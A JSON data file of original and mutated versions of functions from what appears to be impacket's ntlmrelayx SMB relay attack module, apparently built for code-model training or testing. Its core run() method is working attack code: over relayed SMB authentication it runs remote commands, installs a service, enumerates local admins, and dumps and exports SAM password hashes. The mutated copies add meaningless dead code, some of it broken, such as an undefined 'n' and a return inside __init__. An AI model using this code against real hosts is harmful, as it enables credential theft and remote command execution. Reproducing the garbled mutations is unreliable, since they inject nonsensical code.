[
    {
        "func_name": "__init__",
        "original": "def __init__(self, config, SMBClient, username):\n    ProtocolAttack.__init__(self, config, SMBClient, username)\n    if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):\n        self.__SMBConnection = SMBConnection(existingConnection=SMBClient)\n    else:\n        self.__SMBConnection = SMBClient\n    self.__answerTMP = bytearray()\n    if self.config.interactive:\n        self.tcpshell = TcpShell()\n    else:\n        self.tcpshell = None\n        if self.config.exeFile is not None:\n            self.installService = serviceinstall.ServiceInstall(SMBClient, self.config.exeFile)",
        "mutated": [
            "def __init__(self, config, SMBClient, username):\n    if False:\n        i = 10\n    ProtocolAttack.__init__(self, config, SMBClient, username)\n    if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):\n        self.__SMBConnection = SMBConnection(existingConnection=SMBClient)\n    else:\n        self.__SMBConnection = SMBClient\n    self.__answerTMP = bytearray()\n    if self.config.interactive:\n        self.tcpshell = TcpShell()\n    else:\n        self.tcpshell = None\n        if self.config.exeFile is not None:\n            self.installService = serviceinstall.ServiceInstall(SMBClient, self.config.exeFile)",
            "def __init__(self, config, SMBClient, username):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    ProtocolAttack.__init__(self, config, SMBClient, username)\n    if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):\n        self.__SMBConnection = SMBConnection(existingConnection=SMBClient)\n    else:\n        self.__SMBConnection = SMBClient\n    self.__answerTMP = bytearray()\n    if self.config.interactive:\n        self.tcpshell = TcpShell()\n    else:\n        self.tcpshell = None\n        if self.config.exeFile is not None:\n            self.installService = serviceinstall.ServiceInstall(SMBClient, self.config.exeFile)",
            "def __init__(self, config, SMBClient, username):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    ProtocolAttack.__init__(self, config, SMBClient, username)\n    if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):\n        self.__SMBConnection = SMBConnection(existingConnection=SMBClient)\n    else:\n        self.__SMBConnection = SMBClient\n    self.__answerTMP = bytearray()\n    if self.config.interactive:\n        self.tcpshell = TcpShell()\n    else:\n        self.tcpshell = None\n        if self.config.exeFile is not None:\n            self.installService = serviceinstall.ServiceInstall(SMBClient, self.config.exeFile)",
            "def __init__(self, config, SMBClient, username):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    ProtocolAttack.__init__(self, config, SMBClient, username)\n    if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):\n        self.__SMBConnection = SMBConnection(existingConnection=SMBClient)\n    else:\n        self.__SMBConnection = SMBClient\n    self.__answerTMP = bytearray()\n    if self.config.interactive:\n        self.tcpshell = TcpShell()\n    else:\n        self.tcpshell = None\n        if self.config.exeFile is not None:\n            self.installService = serviceinstall.ServiceInstall(SMBClient, self.config.exeFile)",
            "def __init__(self, config, SMBClient, username):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    ProtocolAttack.__init__(self, config, SMBClient, username)\n    if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):\n        self.__SMBConnection = SMBConnection(existingConnection=SMBClient)\n    else:\n        self.__SMBConnection = SMBClient\n    self.__answerTMP = bytearray()\n    if self.config.interactive:\n        self.tcpshell = TcpShell()\n    else:\n        self.tcpshell = None\n        if self.config.exeFile is not None:\n            self.installService = serviceinstall.ServiceInstall(SMBClient, self.config.exeFile)"
        ]
    },
    {
        "func_name": "__answer",
        "original": "def __answer(self, data):\n    self.__answerTMP += data",
        "mutated": [
            "def __answer(self, data):\n    if False:\n        i = 10\n    self.__answerTMP += data",
            "def __answer(self, data):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    self.__answerTMP += data",
            "def __answer(self, data):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    self.__answerTMP += data",
            "def __answer(self, data):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    self.__answerTMP += data",
            "def __answer(self, data):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    self.__answerTMP += data"
        ]
    },
    {
        "func_name": "run",
        "original": "def run(self):\n    if self.tcpshell is not None:\n        LOG.info('Started interactive SMB client shell via TCP on 127.0.0.1:%d' % self.tcpshell.port)\n        self.tcpshell.listen()\n        self.shell = MiniImpacketShell(self.__SMBConnection, self.tcpshell)\n        self.shell.cmdloop()\n        return\n    if self.config.exeFile is not None:\n        result = self.installService.install()\n        if result is True:\n            LOG.info('Service Installed.. CONNECT!')\n            self.installService.uninstall()\n    else:\n        from impacket.examples.secretsdump import RemoteOperations, SAMHashes\n        from impacket.examples.ntlmrelayx.utils.enum import EnumLocalAdmins\n        samHashes = None\n        try:\n            if self.__SMBConnection.getDialect() == smb.SMB_DIALECT:\n                (flags1, flags2) = self.__SMBConnection.getSMBServer().get_flags()\n                flags2 |= smb.SMB.FLAGS2_LONG_NAMES\n                self.__SMBConnection.getSMBServer().set_flags(flags2=flags2)\n            remoteOps = RemoteOperations(self.__SMBConnection, False)\n            remoteOps.enableRegistry()\n        except Exception as e:\n            if 'rpc_s_access_denied' in str(e):\n                if self.config.enumLocalAdmins:\n                    LOG.info(\"Relayed user doesn't have admin on {}. Attempting to enumerate users who do...\".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))\n                    enumLocalAdmins = EnumLocalAdmins(self.__SMBConnection)\n                    try:\n                        (localAdminSids, localAdminNames) = enumLocalAdmins.getLocalAdmins()\n                        LOG.info('Host {} has the following local admins (hint: try relaying one of them here...)'.format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))\n                        for name in localAdminNames:\n                            LOG.info('Host {} local admin member: {} '.format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding), name))\n                    except DCERPCException:\n                        LOG.info('SAMR access denied')\n                    return\n            LOG.error(str(e))\n            return\n        try:\n            if self.config.command is not None:\n                remoteOps._RemoteOperations__executeRemote(self.config.command)\n                LOG.info('Executed specified command on host: %s', self.__SMBConnection.getRemoteHost())\n                self.__SMBConnection.getFile('ADMIN$', 'Temp\\\\__output', self.__answer)\n                self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\\\__output')\n                print(self.__answerTMP.decode(self.config.encoding, 'replace'))\n            else:\n                bootKey = remoteOps.getBootKey()\n                remoteOps._RemoteOperations__serviceDeleted = True\n                samFileName = remoteOps.saveSAM()\n                samHashes = SAMHashes(samFileName, bootKey, isRemote=True)\n                samHashes.dump()\n                samHashes.export(self.__SMBConnection.getRemoteHost() + '_samhashes')\n                LOG.info('Done dumping SAM hashes for host: %s', self.__SMBConnection.getRemoteHost())\n        except Exception as e:\n            LOG.error(str(e))\n        finally:\n            if samHashes is not None:\n                samHashes.finish()\n            if remoteOps is not None:\n                remoteOps.finish()",
        "mutated": [
            "def run(self):\n    if False:\n        i = 10\n    if self.tcpshell is not None:\n        LOG.info('Started interactive SMB client shell via TCP on 127.0.0.1:%d' % self.tcpshell.port)\n        self.tcpshell.listen()\n        self.shell = MiniImpacketShell(self.__SMBConnection, self.tcpshell)\n        self.shell.cmdloop()\n        return\n    if self.config.exeFile is not None:\n        result = self.installService.install()\n        if result is True:\n            LOG.info('Service Installed.. CONNECT!')\n            self.installService.uninstall()\n    else:\n        from impacket.examples.secretsdump import RemoteOperations, SAMHashes\n        from impacket.examples.ntlmrelayx.utils.enum import EnumLocalAdmins\n        samHashes = None\n        try:\n            if self.__SMBConnection.getDialect() == smb.SMB_DIALECT:\n                (flags1, flags2) = self.__SMBConnection.getSMBServer().get_flags()\n                flags2 |= smb.SMB.FLAGS2_LONG_NAMES\n                self.__SMBConnection.getSMBServer().set_flags(flags2=flags2)\n            remoteOps = RemoteOperations(self.__SMBConnection, False)\n            remoteOps.enableRegistry()\n        except Exception as e:\n            if 'rpc_s_access_denied' in str(e):\n                if self.config.enumLocalAdmins:\n                    LOG.info(\"Relayed user doesn't have admin on {}. Attempting to enumerate users who do...\".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))\n                    enumLocalAdmins = EnumLocalAdmins(self.__SMBConnection)\n                    try:\n                        (localAdminSids, localAdminNames) = enumLocalAdmins.getLocalAdmins()\n                        LOG.info('Host {} has the following local admins (hint: try relaying one of them here...)'.format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))\n                        for name in localAdminNames:\n                            LOG.info('Host {} local admin member: {} '.format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding), name))\n                    except DCERPCException:\n                        LOG.info('SAMR access denied')\n                    return\n            LOG.error(str(e))\n            return\n        try:\n            if self.config.command is not None:\n                remoteOps._RemoteOperations__executeRemote(self.config.command)\n                LOG.info('Executed specified command on host: %s', self.__SMBConnection.getRemoteHost())\n                self.__SMBConnection.getFile('ADMIN$', 'Temp\\\\__output', self.__answer)\n                self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\\\__output')\n                print(self.__answerTMP.decode(self.config.encoding, 'replace'))\n            else:\n                bootKey = remoteOps.getBootKey()\n                remoteOps._RemoteOperations__serviceDeleted = True\n                samFileName = remoteOps.saveSAM()\n                samHashes = SAMHashes(samFileName, bootKey, isRemote=True)\n                samHashes.dump()\n                samHashes.export(self.__SMBConnection.getRemoteHost() + '_samhashes')\n                LOG.info('Done dumping SAM hashes for host: %s', self.__SMBConnection.getRemoteHost())\n        except Exception as e:\n            LOG.error(str(e))\n        finally:\n            if samHashes is not None:\n                samHashes.finish()\n            if remoteOps is not None:\n                remoteOps.finish()",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    if self.tcpshell is not None:\n        LOG.info('Started interactive SMB client shell via TCP on 127.0.0.1:%d' % self.tcpshell.port)\n        self.tcpshell.listen()\n        self.shell = MiniImpacketShell(self.__SMBConnection, self.tcpshell)\n        self.shell.cmdloop()\n        return\n    if self.config.exeFile is not None:\n        result = self.installService.install()\n        if result is True:\n            LOG.info('Service Installed.. CONNECT!')\n            self.installService.uninstall()\n    else:\n        from impacket.examples.secretsdump import RemoteOperations, SAMHashes\n        from impacket.examples.ntlmrelayx.utils.enum import EnumLocalAdmins\n        samHashes = None\n        try:\n            if self.__SMBConnection.getDialect() == smb.SMB_DIALECT:\n                (flags1, flags2) = self.__SMBConnection.getSMBServer().get_flags()\n                flags2 |= smb.SMB.FLAGS2_LONG_NAMES\n                self.__SMBConnection.getSMBServer().set_flags(flags2=flags2)\n            remoteOps = RemoteOperations(self.__SMBConnection, False)\n            remoteOps.enableRegistry()\n        except Exception as e:\n            if 'rpc_s_access_denied' in str(e):\n                if self.config.enumLocalAdmins:\n                    LOG.info(\"Relayed user doesn't have admin on {}. Attempting to enumerate users who do...\".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))\n                    enumLocalAdmins = EnumLocalAdmins(self.__SMBConnection)\n                    try:\n                        (localAdminSids, localAdminNames) = enumLocalAdmins.getLocalAdmins()\n                        LOG.info('Host {} has the following local admins (hint: try relaying one of them here...)'.format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))\n                        for name in localAdminNames:\n                            LOG.info('Host {} local admin member: {} '.format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding), name))\n                    except DCERPCException:\n                        LOG.info('SAMR access denied')\n                    return\n            LOG.error(str(e))\n            return\n        try:\n            if self.config.command is not None:\n                remoteOps._RemoteOperations__executeRemote(self.config.command)\n                LOG.info('Executed specified command on host: %s', self.__SMBConnection.getRemoteHost())\n                self.__SMBConnection.getFile('ADMIN$', 'Temp\\\\__output', self.__answer)\n                self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\\\__output')\n                print(self.__answerTMP.decode(self.config.encoding, 'replace'))\n            else:\n                bootKey = remoteOps.getBootKey()\n                remoteOps._RemoteOperations__serviceDeleted = True\n                samFileName = remoteOps.saveSAM()\n                samHashes = SAMHashes(samFileName, bootKey, isRemote=True)\n                samHashes.dump()\n                samHashes.export(self.__SMBConnection.getRemoteHost() + '_samhashes')\n                LOG.info('Done dumping SAM hashes for host: %s', self.__SMBConnection.getRemoteHost())\n        except Exception as e:\n            LOG.error(str(e))\n        finally:\n            if samHashes is not None:\n                samHashes.finish()\n            if remoteOps is not None:\n                remoteOps.finish()",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if self.tcpshell is not None:\n        LOG.info('Started interactive SMB client shell via TCP on 127.0.0.1:%d' % self.tcpshell.port)\n        self.tcpshell.listen()\n        self.shell = MiniImpacketShell(self.__SMBConnection, self.tcpshell)\n        self.shell.cmdloop()\n        return\n    if self.config.exeFile is not None:\n        result = self.installService.install()\n        if result is True:\n            LOG.info('Service Installed.. CONNECT!')\n            self.installService.uninstall()\n    else:\n        from impacket.examples.secretsdump import RemoteOperations, SAMHashes\n        from impacket.examples.ntlmrelayx.utils.enum import EnumLocalAdmins\n        samHashes = None\n        try:\n            if self.__SMBConnection.getDialect() == smb.SMB_DIALECT:\n                (flags1, flags2) = self.__SMBConnection.getSMBServer().get_flags()\n                flags2 |= smb.SMB.FLAGS2_LONG_NAMES\n                self.__SMBConnection.getSMBServer().set_flags(flags2=flags2)\n            remoteOps = RemoteOperations(self.__SMBConnection, False)\n            remoteOps.enableRegistry()\n        except Exception as e:\n            if 'rpc_s_access_denied' in str(e):\n                if self.config.enumLocalAdmins:\n                    LOG.info(\"Relayed user doesn't have admin on {}. Attempting to enumerate users who do...\".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))\n                    enumLocalAdmins = EnumLocalAdmins(self.__SMBConnection)\n                    try:\n                        (localAdminSids, localAdminNames) = enumLocalAdmins.getLocalAdmins()\n                        LOG.info('Host {} has the following local admins (hint: try relaying one of them here...)'.format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))\n                        for name in localAdminNames:\n                            LOG.info('Host {} local admin member: {} '.format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding), name))\n                    except DCERPCException:\n                        LOG.info('SAMR access denied')\n                    return\n            LOG.error(str(e))\n            return\n        try:\n            if self.config.command is not None:\n                remoteOps._RemoteOperations__executeRemote(self.config.command)\n                LOG.info('Executed specified command on host: %s', self.__SMBConnection.getRemoteHost())\n                self.__SMBConnection.getFile('ADMIN$', 'Temp\\\\__output', self.__answer)\n                self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\\\__output')\n                print(self.__answerTMP.decode(self.config.encoding, 'replace'))\n            else:\n                bootKey = remoteOps.getBootKey()\n                remoteOps._RemoteOperations__serviceDeleted = True\n                samFileName = remoteOps.saveSAM()\n                samHashes = SAMHashes(samFileName, bootKey, isRemote=True)\n                samHashes.dump()\n                samHashes.export(self.__SMBConnection.getRemoteHost() + '_samhashes')\n                LOG.info('Done dumping SAM hashes for host: %s', self.__SMBConnection.getRemoteHost())\n        except Exception as e:\n            LOG.error(str(e))\n        finally:\n            if samHashes is not None:\n                samHashes.finish()\n            if remoteOps is not None:\n                remoteOps.finish()",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if self.tcpshell is not None:\n        LOG.info('Started interactive SMB client shell via TCP on 127.0.0.1:%d' % self.tcpshell.port)\n        self.tcpshell.listen()\n        self.shell = MiniImpacketShell(self.__SMBConnection, self.tcpshell)\n        self.shell.cmdloop()\n        return\n    if self.config.exeFile is not None:\n        result = self.installService.install()\n        if result is True:\n            LOG.info('Service Installed.. CONNECT!')\n            self.installService.uninstall()\n    else:\n        from impacket.examples.secretsdump import RemoteOperations, SAMHashes\n        from impacket.examples.ntlmrelayx.utils.enum import EnumLocalAdmins\n        samHashes = None\n        try:\n            if self.__SMBConnection.getDialect() == smb.SMB_DIALECT:\n                (flags1, flags2) = self.__SMBConnection.getSMBServer().get_flags()\n                flags2 |= smb.SMB.FLAGS2_LONG_NAMES\n                self.__SMBConnection.getSMBServer().set_flags(flags2=flags2)\n            remoteOps = RemoteOperations(self.__SMBConnection, False)\n            remoteOps.enableRegistry()\n        except Exception as e:\n            if 'rpc_s_access_denied' in str(e):\n                if self.config.enumLocalAdmins:\n                    LOG.info(\"Relayed user doesn't have admin on {}. Attempting to enumerate users who do...\".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))\n                    enumLocalAdmins = EnumLocalAdmins(self.__SMBConnection)\n                    try:\n                        (localAdminSids, localAdminNames) = enumLocalAdmins.getLocalAdmins()\n                        LOG.info('Host {} has the following local admins (hint: try relaying one of them here...)'.format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))\n                        for name in localAdminNames:\n                            LOG.info('Host {} local admin member: {} '.format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding), name))\n                    except DCERPCException:\n                        LOG.info('SAMR access denied')\n                    return\n            LOG.error(str(e))\n            return\n        try:\n            if self.config.command is not None:\n                remoteOps._RemoteOperations__executeRemote(self.config.command)\n                LOG.info('Executed specified command on host: %s', self.__SMBConnection.getRemoteHost())\n                self.__SMBConnection.getFile('ADMIN$', 'Temp\\\\__output', self.__answer)\n                self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\\\__output')\n                print(self.__answerTMP.decode(self.config.encoding, 'replace'))\n            else:\n                bootKey = remoteOps.getBootKey()\n                remoteOps._RemoteOperations__serviceDeleted = True\n                samFileName = remoteOps.saveSAM()\n                samHashes = SAMHashes(samFileName, bootKey, isRemote=True)\n                samHashes.dump()\n                samHashes.export(self.__SMBConnection.getRemoteHost() + '_samhashes')\n                LOG.info('Done dumping SAM hashes for host: %s', self.__SMBConnection.getRemoteHost())\n        except Exception as e:\n            LOG.error(str(e))\n        finally:\n            if samHashes is not None:\n                samHashes.finish()\n            if remoteOps is not None:\n                remoteOps.finish()",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if self.tcpshell is not None:\n        LOG.info('Started interactive SMB client shell via TCP on 127.0.0.1:%d' % self.tcpshell.port)\n        self.tcpshell.listen()\n        self.shell = MiniImpacketShell(self.__SMBConnection, self.tcpshell)\n        self.shell.cmdloop()\n        return\n    if self.config.exeFile is not None:\n        result = self.installService.install()\n        if result is True:\n            LOG.info('Service Installed.. CONNECT!')\n            self.installService.uninstall()\n    else:\n        from impacket.examples.secretsdump import RemoteOperations, SAMHashes\n        from impacket.examples.ntlmrelayx.utils.enum import EnumLocalAdmins\n        samHashes = None\n        try:\n            if self.__SMBConnection.getDialect() == smb.SMB_DIALECT:\n                (flags1, flags2) = self.__SMBConnection.getSMBServer().get_flags()\n                flags2 |= smb.SMB.FLAGS2_LONG_NAMES\n                self.__SMBConnection.getSMBServer().set_flags(flags2=flags2)\n            remoteOps = RemoteOperations(self.__SMBConnection, False)\n            remoteOps.enableRegistry()\n        except Exception as e:\n            if 'rpc_s_access_denied' in str(e):\n                if self.config.enumLocalAdmins:\n                    LOG.info(\"Relayed user doesn't have admin on {}. Attempting to enumerate users who do...\".format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))\n                    enumLocalAdmins = EnumLocalAdmins(self.__SMBConnection)\n                    try:\n                        (localAdminSids, localAdminNames) = enumLocalAdmins.getLocalAdmins()\n                        LOG.info('Host {} has the following local admins (hint: try relaying one of them here...)'.format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding)))\n                        for name in localAdminNames:\n                            LOG.info('Host {} local admin member: {} '.format(self.__SMBConnection.getRemoteHost().encode(self.config.encoding), name))\n                    except DCERPCException:\n                        LOG.info('SAMR access denied')\n                    return\n            LOG.error(str(e))\n            return\n        try:\n            if self.config.command is not None:\n                remoteOps._RemoteOperations__executeRemote(self.config.command)\n                LOG.info('Executed specified command on host: %s', self.__SMBConnection.getRemoteHost())\n                self.__SMBConnection.getFile('ADMIN$', 'Temp\\\\__output', self.__answer)\n                self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\\\__output')\n                print(self.__answerTMP.decode(self.config.encoding, 'replace'))\n            else:\n                bootKey = remoteOps.getBootKey()\n                remoteOps._RemoteOperations__serviceDeleted = True\n                samFileName = remoteOps.saveSAM()\n                samHashes = SAMHashes(samFileName, bootKey, isRemote=True)\n                samHashes.dump()\n                samHashes.export(self.__SMBConnection.getRemoteHost() + '_samhashes')\n                LOG.info('Done dumping SAM hashes for host: %s', self.__SMBConnection.getRemoteHost())\n        except Exception as e:\n            LOG.error(str(e))\n        finally:\n            if samHashes is not None:\n                samHashes.finish()\n            if remoteOps is not None:\n                remoteOps.finish()"
        ]
    }
]